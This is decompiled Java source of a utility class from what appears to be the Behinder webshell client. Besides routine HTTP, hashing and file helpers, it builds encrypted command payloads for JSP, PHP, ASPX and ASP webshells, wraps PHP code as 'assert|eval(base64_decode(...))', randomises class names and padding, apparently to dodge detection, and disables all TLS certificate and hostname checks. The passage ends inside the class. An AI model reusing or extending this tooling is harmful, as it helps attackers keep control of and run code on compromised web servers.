//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package net.rebeyond.behinder.utils;

import java.awt.Desktop;
import java.awt.Toolkit;
import java.awt.Desktop.Action;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.ClipboardOwner;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.StringSelection;
import java.awt.datatransfer.Transferable;
import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.UncheckedIOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.Proxy;
import java.net.Socket;
import java.net.URI;
import java.net.URL;
import java.net.URLClassLoader;
import java.net.URLDecoder;
import java.net.UnknownHostException;
import java.security.KeyManagementException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.security.cert.X509Certificate;
import java.sql.Timestamp;
import java.text.NumberFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.Date;
import java.util.HashMap;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Optional;
import java.util.Random;
import java.util.concurrent.ConcurrentHashMap;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Collector;
import java.util.zip.GZIPInputStream;
import javafx.scene.control.Alert;
import javafx.scene.control.ButtonType;
import javafx.scene.control.Label;
import javafx.scene.control.TextField;
import javafx.scene.control.Alert.AlertType;
import javafx.scene.image.Image;
import javafx.scene.layout.GridPane;
import javafx.stage.Stage;
import javafx.stage.Window;
import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.KeyManager;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSession;
import javax.net.ssl.SSLSocket;
import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import javax.tools.FileObject;
import javax.tools.ForwardingJavaFileManager;
import javax.tools.JavaCompiler;
import javax.tools.JavaFileManager;
import javax.tools.JavaFileObject;
import javax.tools.SimpleJavaFileObject;
import javax.tools.ToolProvider;
import javax.tools.JavaFileObject.Kind;
import net.rebeyond.behinder.core.Constants;
import net.rebeyond.behinder.core.Crypt;
import net.rebeyond.behinder.core.ICrypt;
import net.rebeyond.behinder.core.Params;
import net.rebeyond.behinder.entity.TransProtocol;
import net.rebeyond.behinder.ui.controller.MainController;
import net.rebeyond.behinder.utils.jc.Run;
import org.json.JSONArray;
import org.json.JSONObject;

public class Utils {
    private static Map<String, JavaFileObject> fileObjects = new ConcurrentHashMap();
    public static Map<AlertType, Alert> alertMap = new HashMap();

    public Utils() {
    }

    public static Alert getAlert(AlertType type) {
        Alert alert = (Alert)alertMap.get(type);
        if (alert == null) {
            alert = new Alert(type);
            Stage stage = (Stage)alert.getDialogPane().getScene().getWindow();

            try {
                stage.getIcons().add(new Image(new ByteArrayInputStream(getResourceData("net/rebeyond/behinder/resource/logo.jpg"))));
            } catch (Exception var4) {
            }

            alert.setResizable(true);
            alert.setHeaderText("");
            Window window = alert.getDialogPane().getScene().getWindow();
            window.setOnCloseRequest((e) -> window.hide());
            alertMap.put(type, alert);
        }

        return alert;
    }

    public static boolean checkIP(String ipAddress) {
        String ip = "([1-9]|[1-9]\\d|1\\d{2}|2[0-4]\\d|25[0-5])(\\.(\\d|[1-9]\\d|1\\d{2}|2[0-4]\\d|25[0-5])){3}";
        Pattern pattern = Pattern.compile(ip);
        Matcher matcher = pattern.matcher(ipAddress);
        return matcher.matches();
    }

    public static boolean checkPort(String portTxt) {
        String port = "([0-9]{1,5})";
        Pattern pattern = Pattern.compile(port);
        Matcher matcher = pattern.matcher(portTxt);
        return matcher.matches() && Integer.parseInt(portTxt) >= 1 && Integer.parseInt(portTxt) <= 65535;
    }

    public static String getKey(String password) throws Exception {
        return getMD5(password);
    }

    public static String sendPostRequest(String urlPath, String cookie, String data) throws Exception {
        StringBuilder result = new StringBuilder();
        URL url = new URL(urlPath);
        HttpURLConnection conn = (HttpURLConnection)url.openConnection();
        conn.setRequestMethod("POST");
        conn.setDoOutput(true);
        conn.setDoInput(true);
        conn.setUseCaches(false);
        if (cookie != null && !cookie.equals("")) {
            conn.setRequestProperty("Cookie", cookie);
        }

        OutputStream outwritestream = conn.getOutputStream();
        outwritestream.write(data.getBytes());
        outwritestream.flush();
        outwritestream.close();
        String line;
        if (conn.getResponseCode() == 200) {
            for(BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream(), "UTF-8")); (line = reader.readLine()) != null; result = result.append(line + "\n")) {
            }
        }

        return result.toString();
    }

    public static Map<String, Object> requestAndParse(String urlPath, Map<String, String> header, byte[] data, int compareMode, int beginIndex, int endIndex, byte[] prefixBytes, byte[] suffixBytes) throws Exception {
        Map<String, Object> resultObj = sendPostRequestBinary(urlPath, header, data);
        byte[] resData = (byte[])resultObj.get("data");
        resultObj.put("data", resData);
        return resultObj;
    }

    private static void addToolsLib(URL jarPath) throws Exception {
        Method method = URLClassLoader.class.getDeclaredMethod("addURL", URL.class);
        method.setAccessible(true);
        URLClassLoader classLoader = (URLClassLoader)ClassLoader.getSystemClassLoader();
        method.invoke(classLoader, jarPath);
        method.setAccessible(false);
    }

    private static JavaCompiler getCompilerInner() throws Exception {
        Class JavacTool = Class.forName("com.sun.tools.javac.api.JavacTool");
        JavaCompiler javaCompiler = (JavaCompiler)JavacTool.newInstance();
        return javaCompiler;
    }

    public static JavaCompiler getCompiler() throws Exception {
        JavaCompiler javaCompiler = ToolProvider.getSystemJavaCompiler();
        if (javaCompiler != null) {
            return javaCompiler;
        } else {
            throw new Exception("本地机器上没有找到编译环境，为了正常使用自定义传输协议功能，请使用JDK（而非JRE）环境打开本软件.");
        }
    }

    public static Map<String, Object> sendPostRequestBinary(String urlPath, Map<String, String> header, byte[] data) throws Exception {
        return OKHttpClientUtil.post(urlPath, header, data);
    }

    public static Map<String, Object> sendPostRequestBinaryOld(String urlPath, Map<String, String> header, byte[] data) throws Exception {
        Map<String, Object> result = new HashMap();
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        URL url = new URL(urlPath);
        HttpURLConnection conn;
        if (MainController.currentProxy.get("proxy") != null) {
            Proxy proxy = (Proxy)MainController.currentProxy.get("proxy");
            conn = (HttpURLConnection)url.openConnection(proxy);
        } else {
            conn = (HttpURLConnection)url.openConnection();
        }

        conn.setConnectTimeout(15000);
        conn.setUseCaches(false);
        conn.setRequestMethod("POST");
        if (header != null) {
            Object[] keys = header.keySet().toArray();
            Arrays.sort(keys);

            for(Object key : keys) {
                conn.setRequestProperty(key.toString(), (String)header.get(key));
            }
        }

        conn.setRequestProperty("Pragma", (String)null);
        conn.setDoOutput(true);
        conn.setDoInput(true);
        conn.setUseCaches(false);
        OutputStream outwritestream = conn.getOutputStream();
        outwritestream.write(data);
        outwritestream.flush();
        outwritestream.close();
        if (conn.getResponseCode() == 200) {
            String encoding = conn.getContentEncoding();
            if (encoding != null) {
                if (encoding != null && encoding.equals("gzip")) {
                    GZIPInputStream gZIPInputStream = null;
                    gZIPInputStream = new GZIPInputStream(conn.getInputStream());
                    DataInputStream din = new DataInputStream(gZIPInputStream);
                    byte[] buffer = new byte[1024];
                    int length = 0;

                    while((length = din.read(buffer)) != -1) {
                        bos.write(buffer, 0, length);
                    }
                } else {
                    DataInputStream din = new DataInputStream(conn.getInputStream());
                    byte[] buffer = new byte[1024];
                    int length = 0;

                    while((length = din.read(buffer)) != -1) {
                        bos.write(buffer, 0, length);
                    }
                }
            } else {
                DataInputStream din = new DataInputStream(conn.getInputStream());
                byte[] buffer = new byte[1024];
                int length = 0;

                while((length = din.read(buffer)) != -1) {
                    bos.write(buffer, 0, length);
                }
            }

            byte[] resData = bos.toByteArray();
            result.put("data", resData);
            Map<String, String> responseHeader = new HashMap();

            for(String key : conn.getHeaderFields().keySet()) {
                responseHeader.put(key, conn.getHeaderField(key));
            }

            responseHeader.put("status", conn.getResponseCode() + "");
            result.put("header", responseHeader);
            return result;
        } else {
            DataInputStream din = new DataInputStream(conn.getErrorStream());
            byte[] buffer = new byte[1024];
            int length = 0;

            while((length = din.read(buffer)) != -1) {
                bos.write(buffer, 0, length);
            }

            throw new Exception(new String(bos.toByteArray(), "GBK"));
        }
    }

    public static String sendPostRequest(String urlPath, String cookie, byte[] data) throws Exception {
        StringBuilder sb = new StringBuilder();
        URL url = new URL(urlPath);
        HttpURLConnection conn = (HttpURLConnection)url.openConnection();
        conn.setRequestProperty("Content-Type", "application/octet-stream");
        conn.setRequestMethod("POST");
        conn.setDoOutput(true);
        conn.setDoInput(true);
        conn.setUseCaches(false);
        if (cookie != null && !cookie.equals("")) {
            conn.setRequestProperty("Cookie", cookie);
        }

        OutputStream outwritestream = conn.getOutputStream();
        outwritestream.write(data);
        outwritestream.flush();
        outwritestream.close();
        if (conn.getResponseCode() == 200) {
            String line;
            for(BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream(), "UTF-8")); (line = reader.readLine()) != null; sb = sb.append(line + "\n")) {
            }

            String result = sb.toString();
            if (result.endsWith("\n")) {
                result = result.substring(0, result.length() - 1);
            }

            return result;
        } else {
            String line;
            for(BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getErrorStream(), "UTF-8")); (line = reader.readLine()) != null; sb = sb.append(line + "\n")) {
            }

            throw new Exception("请求返回异常" + sb.toString());
        }
    }

    public static byte[] shortToBytes(int n) {
        byte[] b = new byte[2];
        b[1] = (byte)(n & 255);
        b[0] = (byte)(n >> 8 & 255);
        return b;
    }

    public static byte[] intToBytes(int n) {
        byte[] b = new byte[4];
        b[3] = (byte)(n & 255);
        b[2] = (byte)(n >> 8 & 255);
        b[1] = (byte)(n >> 16 & 255);
        b[0] = (byte)(n >> 24 & 255);
        return b;
    }

    public static String sendGetRequest(String urlPath, String cookie) throws Exception {
        StringBuilder sb = new StringBuilder();
        URL url = new URL(urlPath);
        HttpURLConnection conn = (HttpURLConnection)url.openConnection();
        conn.setRequestProperty("Content-Type", "text/plain");
        conn.setRequestMethod("GET");
        conn.setDoOutput(true);
        conn.setDoInput(true);
        conn.setUseCaches(false);
        if (cookie != null && !cookie.equals("")) {
            conn.setRequestProperty("Cookie", cookie);
        }

        if (conn.getResponseCode() == 200) {
            String line;
            for(BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream(), "UTF-8")); (line = reader.readLine()) != null; sb = sb.append(line + "\n")) {
            }

            String result = sb.toString();
            if (result.endsWith("\n")) {
                result = result.substring(0, result.length() - 1);
            }

            return result;
        } else {
            String line;
            for(BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getErrorStream(), "UTF-8")); (line = reader.readLine()) != null; sb = sb.append(line + "\n")) {
            }

            throw new Exception("请求返回异常" + sb.toString());
        }
    }

    public static boolean openWebpage(URI uri) {
        Desktop desktop = Desktop.isDesktopSupported() ? Desktop.getDesktop() : null;
        if (desktop != null && desktop.isSupported(Action.BROWSE)) {
            try {
                desktop.browse(uri);
                return true;
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        return false;
    }

    public static byte[] getEvalDataWithTransprotocol(ICrypt cryptor, String key, String type, byte[] payload) throws Exception {
        TransProtocol transProtocol = cryptor.getTransProtocol(type);
        Map<String, String> params = new HashMap();
        byte[] bincls = new byte[0];
        if (type.equals("jsp")) {
            bincls = Params.getParamedClass("Eval", params, transProtocol);
        } else if (type.equals("asp")) {
            bincls = (new String(bincls)).replace("__Encrypt__", transProtocol.getEncode()).getBytes();
        } else if (type.equals("php")) {
            bincls = (new String(bincls) + "\n" + transProtocol.getEncode() + "\n").getBytes();
        } else if (type.equals("aspx")) {
        }

        return getEvalData(cryptor, type, bincls);
    }

    public static byte[] getEvalData(ICrypt cryptor, String type, byte[] payload) throws Exception {
        byte[] result = null;
        if (type.equals("jsp")) {
            result = cryptor.encrypt(payload);
        } else if (type.equals("php")) {
            if (!cryptor.isCustomized()) {
                payload = ("assert|eval(base64_decode('" + Base64.getEncoder().encodeToString(payload) + "'));").getBytes();
            }

            result = cryptor.encrypt(payload);
        } else if (type.equals("aspx")) {
            Map<String, String> params = new LinkedHashMap();
            params.put("code", new String(payload));
            result = getData(cryptor, "Eval", params, type);
        } else if (type.equals("dotnetCore")) {
            Map<String, String> params = new LinkedHashMap();
            params.put("code", new String(payload));
            result = getData(cryptor, "Eval", params, type);
        } else if (type.equals("asp")) {
            result = cryptor.encrypt(payload);
        }

        return result;
    }

    public static String bytesToHex(byte[] bytes) {
        StringBuffer sb = new StringBuffer();

        for(int i = 0; i < bytes.length; ++i) {
            String hex = Integer.toHexString(bytes[i] & 255);
            if (hex.length() < 2) {
                sb.append(0);
            }

            sb.append(hex);
        }

        return sb.toString();
    }

    public static byte hexToByte(String inHex) {
        return (byte)Integer.parseInt(inHex, 16);
    }

    public static byte[] hexToByteArray(String inHex) {
        int hexlen = inHex.length();
        byte[] result;
        if (hexlen % 2 == 1) {
            ++hexlen;
            result = new byte[hexlen / 2];
            inHex = "0" + inHex;
        } else {
            result = new byte[hexlen / 2];
        }

        int j = 0;

        for(int i = 0; i < hexlen; i += 2) {
            result[j] = hexToByte(inHex.substring(i, i + 2));
            ++j;
        }

        return result;
    }

    public static byte[] getPluginData(String key, String payloadPath, Map<String, String> params, String type) throws Exception {
        if (type.equals("jsp")) {
            byte[] bincls = Params.getParamedClassForPlugin(payloadPath, params);
            return bincls;
        } else if (type.equals("php")) {
            byte[] bincls = Params.getParamedPhpForPlugin(payloadPath, params);
            return bincls;
        } else if (type.equals("aspx")) {
            byte[] bincls = Params.getParamedAssemblyForPlugin(payloadPath, params);
            return bincls;
        } else if (type.equals("asp")) {
            byte[] bincls = Params.getParamedAsp(payloadPath, params);
            byte[] encrypedBincls = Crypt.EncryptForAsp(bincls, key);
            return encrypedBincls;
        } else {
            return null;
        }
    }

    public static byte[] getData(String key, int encryptType, String className, Map<String, String> params, String type) throws Exception {
        return getData(key, encryptType, className, params, type, (byte[])null);
    }

    public static String map2Str(Map<String, String> paramsMap) {
        String result = "";

        for(String key : paramsMap.keySet()) {
            result = result + key + "^" + (String)paramsMap.get(key) + "\n";
        }

        return result;
    }

    public static String getFileType(String fileName) {
        int extIndex = fileName.lastIndexOf(".");
        return extIndex >= 0 ? fileName.substring(extIndex + 1).toLowerCase() : "";
    }

    public static String getRandomClassName(String sourceName) {
        String[] domainAs = new String[]{"com", "net", "org", "sun"};
        String domainB = getRandomAlpha((new Random()).nextInt(5) + 3).toLowerCase();
        String domainC = getRandomAlpha((new Random()).nextInt(5) + 3).toLowerCase();
        String domainD = getRandomAlpha((new Random()).nextInt(5) + 3).toLowerCase();
        String className = getRandomAlpha((new Random()).nextInt(7) + 4);
        className = className.substring(0, 1).toUpperCase() + className.substring(1).toLowerCase();
        int domainAIndex = (new Random()).nextInt(4);
        String domainA = domainAs[domainAIndex];
        int randomSegments = (new Random()).nextInt(3) + 3;
        String randomName;
        switch (randomSegments) {
            case 3:
                randomName = domainA + "/" + domainB + "/" + className;
                break;
            case 4:
                randomName = domainA + "/" + domainB + "/" + domainC + "/" + className;
                break;
            case 5:
                randomName = domainA + "/" + domainB + "/" + domainC + "/" + domainD + "/" + className;
                break;
            default:
                randomName = domainA + "/" + domainB + "/" + domainC + "/" + domainD + "/" + className;
        }

        while(randomName.length() > sourceName.length()) {
        }

        return randomName;
    }

    public static byte[] getData(ICrypt cryptor, String className, Map<String, String> params, String scriptType, byte[] extraData) throws Exception {
        if (scriptType.equals("jsp")) {
            byte[] bincls = Params.getParamedClass(className, params, cryptor.getTransProtocol(scriptType));
            if (extraData != null) {
                bincls = CipherUtils.mergeByteArray(new byte[][]{bincls, extraData});
            }

            byte[] encrypedBincls = cryptor.encrypt(bincls);
            return encrypedBincls;
        } else if (scriptType.equals("php")) {
            byte[] bincls = Params.getParamedPhp(className, params, cryptor.getTransProtocol(scriptType));
            if (!cryptor.isCustomized()) {
                bincls = ("assert|eval(base64_decode('" + Base64.getEncoder().encodeToString(bincls) + "'));").getBytes();
            }

            if (extraData != null) {
                bincls = CipherUtils.mergeByteArray(new byte[][]{bincls, extraData});
            }

            byte[] encrypedBincls = cryptor.encrypt(bincls);
            return encrypedBincls;
        } else if (scriptType.equals("aspx")) {
            byte[] bincls = Params.getParamedAssembly(className, params, cryptor.getTransProtocol(scriptType));
            if (extraData != null) {
                bincls = CipherUtils.mergeByteArray(new byte[][]{bincls, extraData});
            }

            byte[] encrypedBincls = cryptor.encrypt(bincls);
            return encrypedBincls;
        } else if (scriptType.equals("dotnetCore")) {
            byte[] bincls = Params.getParamedAssemblyDotnetCore(className, params, cryptor.getTransProtocol(scriptType));
            if (extraData != null) {
                bincls = CipherUtils.mergeByteArray(new byte[][]{bincls, extraData});
            }

            byte[] encrypedBincls = cryptor.encrypt(bincls);
            return encrypedBincls;
        } else if (scriptType.equals("asp")) {
            byte[] bincls = Params.getParamedAsp(className, params, cryptor.getTransProtocol(scriptType));
            byte[] encrypedBincls = cryptor.encrypt(bincls);
            return encrypedBincls;
        } else if (!scriptType.equals("native")) {
            return null;
        } else {
            JSONObject payloadObj = new JSONObject();
            String shellAction = getShellAction(5);
            if (shellAction.equals("parseCommonAction")) {
                shellAction = getShellAction(6);
            }

            payloadObj.put("action", shellAction);
            JSONArray paramArr = new JSONArray();

            for(String paramName : params.keySet()) {
                JSONObject paramObj = new JSONObject();
                paramObj.put("name", paramName);
                paramObj.put("value", params.get(paramName));
                paramArr.put(paramObj);
            }

            payloadObj.put("params", paramArr);
            byte[] encrypedBincls = cryptor.encryptCompatible(payloadObj.toString().getBytes());
            return encrypedBincls;
        }
    }

    public static byte[] getData(ICrypt cryptor, String className, Map<String, String> params, String scriptType) throws Exception {
        return getData(cryptor, className, params, scriptType, (byte[])null);
    }

    public static byte[] getData(String key, int encryptType, String className, Map<String, String> params, String type, byte[] extraData) throws Exception {
        if (type.equals("jsp")) {
            byte[] bincls = Params.getParamedClass(className, params);
            if (extraData != null) {
                bincls = CipherUtils.mergeByteArray(new byte[][]{bincls, extraData});
            }

            byte[] encrypedBincls = Crypt.Encrypt(bincls, key);
            String basedEncryBincls = Base64.getEncoder().encodeToString(encrypedBincls);
            return basedEncryBincls.getBytes();
        } else if (type.equals("php")) {
            byte[] bincls = Params.getParamedPhp(className, params);
            bincls = Base64.getEncoder().encodeToString(bincls).getBytes();
            bincls = ("assert|eval(base64_decode('" + new String(bincls) + "'));").getBytes();
            if (extraData != null) {
                bincls = CipherUtils.mergeByteArray(new byte[][]{bincls, extraData});
            }

            byte[] encrypedBincls = Crypt.EncryptForPhp(bincls, key, encryptType);
            return ("\n" + Base64.getEncoder().encodeToString(encrypedBincls)).getBytes();
        } else if (type.equals("aspx")) {
            byte[] bincls = Params.getParamedAssembly(className, params);
            if (extraData != null) {
                bincls = CipherUtils.mergeByteArray(new byte[][]{bincls, extraData});
            }

            byte[] encrypedBincls = Crypt.EncryptForCSharp(bincls, key);
            return encrypedBincls;
        } else if (type.equals("asp")) {
            byte[] bincls = Params.getParamedAsp(className, params);
            if (extraData != null) {
                bincls = CipherUtils.mergeByteArray(new byte[][]{bincls, extraData});
            }

            byte[] encrypedBincls = Crypt.EncryptForAsp(bincls, key);
            return encrypedBincls;
        } else if (!type.equals("native")) {
            return null;
        } else {
            JSONObject payloadObj = new JSONObject();
            String shellAction = getShellAction(5);
            payloadObj.put("action", shellAction);
            JSONArray paramArr = new JSONArray();

            for(String paramName : params.keySet()) {
                JSONObject paramObj = new JSONObject();
                paramObj.put("name", paramName);
                paramObj.put("value", params.get(paramName));
                paramArr.put(paramObj);
            }

            payloadObj.put("params", paramArr);
            byte[] encrypedBincls = Crypt.Encrypt(payloadObj.toString().getBytes(), key);
            String basedEncryBincls = Base64.getEncoder().encodeToString(encrypedBincls);
            return (basedEncryBincls + "\n").getBytes();
        }
    }

    public static String getShellAction(int depth) {
        return getMethodName(depth);
    }

    public static String getMethodName(int depth) {
        StackTraceElement[] ste = Thread.currentThread().getStackTrace();
        return ste[depth].getMethodName();
    }

    public static byte[] getFileData(String filePath) throws Exception {
        byte[] fileContent = new byte[0];
        FileInputStream fis = new FileInputStream(new File(filePath));
        byte[] buffer = new byte[10240000];

        int length;
        for(length = 0; (length = fis.read(buffer)) > 0; fileContent = mergeBytes(fileContent, Arrays.copyOfRange(buffer, 0, length))) {
        }

        fis.close();
        return fileContent;
    }

    public static void writeFileData(String filePath, byte[] fileContent) throws Exception {
        FileOutputStream fso = new FileOutputStream(filePath);
        fso.write(fileContent);
        fso.flush();
        fso.close();
    }

    public static List<byte[]> splitBytes(byte[] content, int size) throws Exception {
        List<byte[]> result = new ArrayList();
        byte[] buffer = new byte[size];
        ByteArrayInputStream bis = new ByteArrayInputStream(content);
        int length = 0;

        while((length = bis.read(buffer)) > 0) {
            result.add(Arrays.copyOfRange(buffer, 0, length));
        }

        bis.close();
        return result;
    }

    public static int indexOf(byte[] outerArray, byte[] smallerArray) {
        for(int i = 0; i < outerArray.length - smallerArray.length + 1; ++i) {
            boolean found = true;

            for(int j = 0; j < smallerArray.length; ++j) {
                if (outerArray[i + j] != smallerArray[j]) {
                    found = false;
                    break;
                }
            }

            if (found) {
                return i;
            }
        }

        return -1;
    }

    public static String[] splitString(String str, int length) {
        int len = str.length();
        String[] arr = new String[(len + length - 1) / length];

        for(int i = 0; i < len; i += length) {
            int n = len - i;
            if (n > length) {
                n = length;
            }

            arr[i / length] = str.substring(i, i + n);
        }

        return arr;
    }

    public static void setClipboardString(String text) {
        Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
        Transferable trans = new StringSelection(text);
        clipboard.setContents(trans, (ClipboardOwner)null);
    }

    public static String getClipboardString() {
        String result = "";
        Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
        Transferable trnas = clipboard.getContents((Object)null);
        if (trnas != null && trnas.isDataFlavorSupported(DataFlavor.stringFlavor)) {
            try {
                result = (String)trnas.getTransferData(DataFlavor.stringFlavor);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        return result;
    }

    public static byte[] getResourceData(String filePath) throws Exception {
        InputStream is = Utils.class.getClassLoader().getResourceAsStream(filePath);
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        byte[] buffer = new byte[102400];
        int num = 0;

        while((num = is.read(buffer)) != -1) {
            bos.write(buffer, 0, num);
            bos.flush();
        }

        is.close();
        return bos.toByteArray();
    }

    public static byte[] ascii2unicode(String str, int type) throws Exception {
        ByteArrayOutputStream buf = new ByteArrayOutputStream();
        DataOutputStream out = new DataOutputStream(buf);

        for(byte b : str.getBytes()) {
            out.writeByte(b);
            out.writeByte(0);
        }

        if (type == 1) {
            out.writeChar(0);
        }

        return buf.toByteArray();
    }

    public static byte[] mergeBytes(byte[] a, byte[] b) throws Exception {
        ByteArrayOutputStream output = new ByteArrayOutputStream();
        output.write(a);
        output.write(b);
        return output.toByteArray();
    }

    public static JSONObject entity2jsonObject(Object entity) {
        JSONObject jsonObject = new JSONObject();

        for(Field field : entity.getClass().getDeclaredFields()) {
            try {
                String name = field.getName();
                String value = field.get(entity).toString();
                jsonObject.put(name, value);
            } catch (IllegalAccessException e) {
                e.printStackTrace();
            }
        }

        return jsonObject;
    }

    public static String getPercent(int small, int big) {
        NumberFormat numberFormat = NumberFormat.getInstance();
        numberFormat.setMaximumFractionDigits(2);
        String result = numberFormat.format((double)((float)small / (float)big * 100.0F)) + "%";
        return result;
    }

    public static byte[] getClassFromSourceCode(String sourceCode) throws Exception {
        return Run.getClassFromSourceCode(sourceCode);
    }

    public static String getSelfPath() throws Exception {
        String currentPath = Utils.class.getProtectionDomain().getCodeSource().getLocation().getPath();
        currentPath = currentPath.substring(0, currentPath.lastIndexOf("/") + 1);
        currentPath = (new File(currentPath)).getCanonicalPath();
        return currentPath;
    }

    public static String getSelfPath(String coding) throws Exception {
        return URLDecoder.decode(getSelfPath(), coding);
    }

    public static String getSelfJarPath() throws Exception {
        String currentPath = Utils.class.getProtectionDomain().getCodeSource().getLocation().getPath().toString();
        if (System.getProperty("os.name").toLowerCase().indexOf("windows") >= 0 && currentPath.startsWith("/")) {
            currentPath = currentPath.substring(1);
        }

        return currentPath;
    }

    public static <T> T json2Obj(JSONObject json, Class target) throws Exception {
        Object obj = target.newInstance();

        for(Field f : target.getDeclaredFields()) {
            try {
                String filedName = f.getName();
                String setName = "set" + filedName.substring(0, 1).toUpperCase() + filedName.substring(1);
                Method m = target.getMethod(setName, String.class);
                m.invoke(obj, json.get(filedName).toString());
            } catch (Exception var10) {
            }
        }

        return (T)obj;
    }

    public static String getMD5(String input) throws NoSuchAlgorithmException {
        if (input != null && input.length() != 0) {
            MessageDigest md5 = MessageDigest.getInstance("MD5");
            md5.update(input.getBytes());
            byte[] byteArray = md5.digest();
            StringBuilder sb = new StringBuilder();

            for(byte b : byteArray) {
                sb.append(String.format("%02x", b));
            }

            return sb.toString().substring(0, 16);
        } else {
            return null;
        }
    }

    public static String getMD5(byte[] input) throws NoSuchAlgorithmException {
        if (input != null && input.length != 0) {
            MessageDigest md5 = MessageDigest.getInstance("MD5");
            md5.update(input);
            byte[] byteArray = md5.digest();
            StringBuilder sb = new StringBuilder();

            for(byte b : byteArray) {
                sb.append(String.format("%02x", b));
            }

            return sb.toString().substring(0, 16);
        } else {
            return null;
        }
    }

    public static String getFileMD5(String filePath) throws Exception {
        byte[] input = getFileData(filePath);
        if (input != null && input.length != 0) {
            MessageDigest md5 = MessageDigest.getInstance("MD5");
            md5.update(input);
            byte[] byteArray = md5.digest();
            StringBuilder sb = new StringBuilder();

            for(byte b : byteArray) {
                sb.append(String.format("%02x", b));
            }

            return sb.substring(0, 16);
        } else {
            return null;
        }
    }

    public static void main(String[] args) {
        String sourceCode = "package net.rebeyond.behinder.utils;public class Hello{    public String sayHello (String name) {return \"Hello,\" + name + \"!\";}}";

        try {
            getClassFromSourceCode(sourceCode);
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    public static void disableSslVerification() {
        try {
            TrustManager[] trustAllCerts = new TrustManager[]{new X509TrustManager() {
                public X509Certificate[] getAcceptedIssuers() {
                    return null;
                }

                public void checkClientTrusted(X509Certificate[] certs, String authType) {
                }

                public void checkServerTrusted(X509Certificate[] certs, String authType) {
                }
            }};
            SSLContext sc = SSLContext.getInstance("SSL");
            sc.init((KeyManager[])null, trustAllCerts, new SecureRandom());
            List<String> cipherSuites = new ArrayList();

            for(String cipher : sc.getSupportedSSLParameters().getCipherSuites()) {
                if (cipher.indexOf("_DHE_") < 0 && cipher.indexOf("_DH_") < 0) {
                    cipherSuites.add(cipher);
                }
            }

            HttpsURLConnection.setDefaultSSLSocketFactory(new MySSLSocketFactory(sc.getSocketFactory(), (String[])cipherSuites.toArray(new String[0])));
            HostnameVerifier allHostsValid = new HostnameVerifier() {
                public boolean verify(String hostname, SSLSession session) {
                    return true;
                }
            };
            HttpsURLConnection.setDefaultHostnameVerifier(allHostsValid);
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        } catch (KeyManagementException e) {
            e.printStackTrace();
        }

    }

    public static Map<String, String> jsonToMap(JSONObject obj) {
        Map<String, String> result = new HashMap();

        for(String key : obj.keySet()) {
            result.put(key, (String)obj.get(key));
        }

        return result;
    }

    public static Timestamp getCurrentDate() {
        return new Timestamp(System.currentTimeMillis());
    }

    public static Timestamp stringToTimestamp(String timeString) {
        Timestamp timestamp = null;

        try {
            SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss.SSS");
            Date parsedDate = dateFormat.parse(timeString);
            timestamp = new Timestamp(parsedDate.getTime());
        } catch (Exception var4) {
        }

        return timestamp;
    }

    public static String getRandomString(int length) {
        String str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        Random random = new Random();
        StringBuffer sb = new StringBuffer();

        for(int i = 0; i < length; ++i) {
            int number = random.nextInt(62);
            sb.append(str.charAt(number));
        }

        return sb.toString();
    }

    public static String getRandomAlpha(int length) {
        String str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        Random random = new Random();
        StringBuffer sb = new StringBuffer();

        for(int i = 0; i < length; ++i) {
            int number = random.nextInt(52);
            sb.append(str.charAt(number));
        }

        return sb.toString();
    }

    public static String getWhatever() {
        int randStringLength = (new SecureRandom()).nextInt(3000);
        String randString = getRandomString(randStringLength);
        return randString;
    }

    public static int matchData(byte[] srcData, byte[] dataToFind) {
        int iDataLen = srcData.length;
        int iDataToFindLen = dataToFind.length;
        boolean bGotData = false;
        int iMatchDataCntr = 0;

        for(int i = 0; i < iDataLen; ++i) {
            if (srcData[i] == dataToFind[iMatchDataCntr]) {
                ++iMatchDataCntr;
                bGotData = true;
            } else if (srcData[i] == dataToFind[0]) {
                iMatchDataCntr = 1;
            } else {
                iMatchDataCntr = 0;
                bGotData = false;
            }

            if (iMatchDataCntr == iDataToFindLen) {
                return i - dataToFind.length + 1;
            }
        }

        return -1;
    }

    public static String formatPath(String path) {
        if (path.indexOf("\\") > 0) {
            path = path.replaceAll("\\\\", "/");
        }

        if (path.endsWith(":")) {
            path = path + "/";
        }

        if (!path.endsWith("/")) {
            path = path + "/";
        }

        if (isWindowsPath(path)) {
            path = path.substring(0, 1).toUpperCase() + path.substring(1);
        }

        return path;
    }

